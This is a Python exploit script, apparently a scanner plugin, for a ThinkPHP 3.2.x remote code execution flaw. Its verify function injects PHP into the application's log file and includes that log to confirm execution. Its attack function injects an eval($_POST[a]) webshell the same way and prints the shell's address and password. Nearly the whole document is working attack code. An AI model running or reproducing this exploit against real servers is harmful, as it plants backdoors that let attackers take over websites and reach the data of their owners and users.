import requests
import re, socket
import urllib
from urllib.parse import urlparse
from datetime import date, timedelta

def verify(url):
    relsult = {
        'name': 'ThinkPHP3.2.x 远程代码执行',
        'vulnerable': False,
        'attack': True,
    }
    payload1 = b'''
GET /index.php?m=--><?=md5(1);?> HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
Upgrade-Insecure-Requests: 1

    '''.replace(b'\n', b'\r\n')
    try:
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(payload1)
            req1 = conn.recv(10240).decode()
            today = (date.today() + timedelta()).strftime("%y_%m_%d")
            payload2 = urllib.parse.urljoin(url, 'index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(today))
            req2 = requests.get(payload2, timeout=3)
            if re.search(r'c4ca4238a0b923820dcc509a6f75849b', req2.text):
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = payload2
                relsult['about'] = 'https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ,https://www.seebug.org/vuldb/ssvid-99297'
            return relsult
    except:
        return relsult


def attack(url):
    payload1 = b'''GET /index.php?m=--><?=eval($_POST[a]);?> HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
Upgrade-Insecure-Requests: 1

'''.replace(b'\n', b'\r\n')
    try:
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        print('[+] 正在上传webshell.................')
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(payload1)
            req1 = conn.recv(10240).decode()
            today = (date.today() + timedelta()).strftime("%y_%m_%d")
            payload2 = urllib.parse.urljoin(url, 'index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(today))
            req2 = requests.get(payload2, timeout=3)
        if req2.status_code == 200:
            print('[*] webshell上传成功!')
            print('[*] Webshell地址: {0}'.format(payload2))
            print('[*] 密码: a')
            print('[+] have a good day!')
            return True
        else:
            print('[-] webshell上传失败请检查是否存在漏洞?')
            return False
    except:
        return False

